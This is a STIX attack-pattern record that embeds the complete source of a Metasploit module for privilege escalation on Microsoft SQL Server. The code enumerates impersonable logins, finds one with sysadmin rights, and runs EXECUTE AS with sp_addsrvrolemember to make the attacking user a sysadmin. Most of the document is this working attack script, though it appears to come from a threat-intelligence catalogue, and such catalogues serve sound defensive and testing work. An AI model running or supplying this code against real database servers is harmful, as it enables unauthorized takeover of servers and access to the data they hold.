{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2e0b3915-0d03-4337-9ec1-4c6d73724f7b",
    "created": "2024-08-14T16:22:29.898449Z",
    "modified": "2024-08-14T16:22:29.898453Z",
    "name": "Microsoft SQL Server Escalate EXECUTE AS",
    "description": " This module can be used escalate privileges if the IMPERSONATION privilege has been assigned to the user. In most cases, this results in additional data access, but in some cases it can be used to gain sysadmin privileges. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/mssql/mssql_escalate_execute_as.rb",
            "external_id": "mssql_escalate_execute_as.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::MSSQL\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Microsoft SQL Server Escalate EXECUTE AS',\n      'Description' => %q{\n        This module can be used escalate privileges if the IMPERSONATION privilege has been\n        assigned to the user. In most cases, this results in additional data access, but in\n        some cases it can be used to gain sysadmin privileges.\n      },\n      'Author'      => ['nullbind <scott.sutherland[at]netspi.com>'],\n      'License'     => MSF_LICENSE,\n      'References'  => [['URL','http://msdn.microsoft.com/en-us/library/ms178640.aspx']]\n    ))\n  end\n\n  def run\n    # Check connection and issue initial query\n    print_status(\"Attempting to connect to the database server at #{rhost}:#{rport} as #{datastore['USERNAME']}...\")\n    if mssql_login_datastore\n      print_good('Connected.')\n    else\n      print_error('Login was unsuccessful. Check your credentials.')\n      disconnect\n      return\n    end\n\n    # Query for sysadmin status\n    print_status(\"Checking if #{datastore['USERNAME']} has the sysadmin role...\")\n    user_status = check_sysadmin\n\n    # Check if user has sysadmin role\n    if user_status == 1\n      print_good(\"#{datastore['USERNAME']} has the sysadmin role, no escalation required.\")\n      disconnect\n      return\n    else\n      print_status(\"You're NOT a sysadmin, let's try to change that.\")\n    end\n\n    # Get a list of the users that can be impersonated\n    print_status(\"Enumerating a list of users that can be impersonated...\")\n    imp_user_list = check_imp_users\n    if imp_user_list.nil? || imp_user_list.length == 0\n      print_error('Sorry, the current user doesn\\'t have permissions to impersonate anyone.')\n      disconnect\n      return\n    else\n      # Display list of users that can be impersonated\n      print_good(\"#{imp_user_list.length} users can be impersonated:\")\n      imp_user_list.each do |db|\n        print_status(\" - #{db[0]}\")\n      end\n    end\n\n    # Check if any of the users that can be impersonated are sysadmins\n    print_status('Checking if any of them are sysadmins...')\n    imp_user_sysadmin = check_imp_sysadmin(imp_user_list)\n    if imp_user_sysadmin.nil?\n      print_error('Sorry, none of the users that can be impersonated are sysadmins.')\n      disconnect\n      return\n    end\n\n    # Attempt to escalate to sysadmin\n    print_status(\"Attempting to impersonate #{imp_user_sysadmin[0]}...\")\n    escalate_status = escalate_privs(imp_user_sysadmin[0])\n    if escalate_status\n      # Check if escalation was successful\n      user_status = check_sysadmin\n      if user_status == 1\n        print_good(\"Congrats, #{datastore['USERNAME']} is now a sysadmin!.\")\n      else\n        print_error('Fail buckets, something went wrong.')\n      end\n    else\n      print_error('Error while trying to escalate privileges.')\n    end\n\n    disconnect\n    return\n  end\n\n  # Checks if user is a sysadmin\n  def check_sysadmin\n    # Setup query to check for sysadmin\n    sql = \"select is_srvrolemember('sysadmin') as IsSysAdmin\"\n\n    # Run query\n    result = mssql_query(sql)\n\n    # Parse query results\n    parse_results = result[:rows]\n    status = parse_results[0][0]\n\n    # Return status\n    return status\n  end\n\n  # Gets trusted databases owned by sysadmins\n  def check_imp_users\n    # Setup query\n    sql = \"SELECT DISTINCT b.name\n    FROM  sys.server_permissions a\n    INNER JOIN sys.server_principals b\n    ON a.grantor_principal_id = b.principal_id\n    WHERE a.permission_name = 'IMPERSONATE'\"\n\n    result = mssql_query(sql)\n\n    # Return on success\n    return result[:rows]\n  end\n\n  # Checks if user has the db_owner role\n  def check_imp_sysadmin(trust_db_list)\n    # Check if the user has the db_owner role is any databases\n    trust_db_list.each do |imp_user|\n      # Setup query\n      sql = \"select IS_SRVROLEMEMBER('sysadmin','#{imp_user[0]}') as status\"\n\n      # Run query\n      result = mssql_query(sql)\n\n      # Parse query results\n      parse_results = result[:rows]\n      status = parse_results[0][0]\n      if status == 1\n        print_good(\" - #{imp_user[0]} is a sysadmin!\")\n        return imp_user\n      else\n        print_status(\" - #{imp_user[0]} is NOT sysadmin!\")\n      end\n    end\n    nil\n  end\n\n  def escalate_privs(imp_user_sysadmin)\n    # Impersonate the first sysadmin user on the list\n    evil_sql_create = \"EXECUTE AS Login = '#{imp_user_sysadmin}';\n    EXEC sp_addsrvrolemember '#{datastore['USERNAME']}','sysadmin';\"\n\n    mssql_query(evil_sql_create)\n\n    true\n  end\nend\n"
}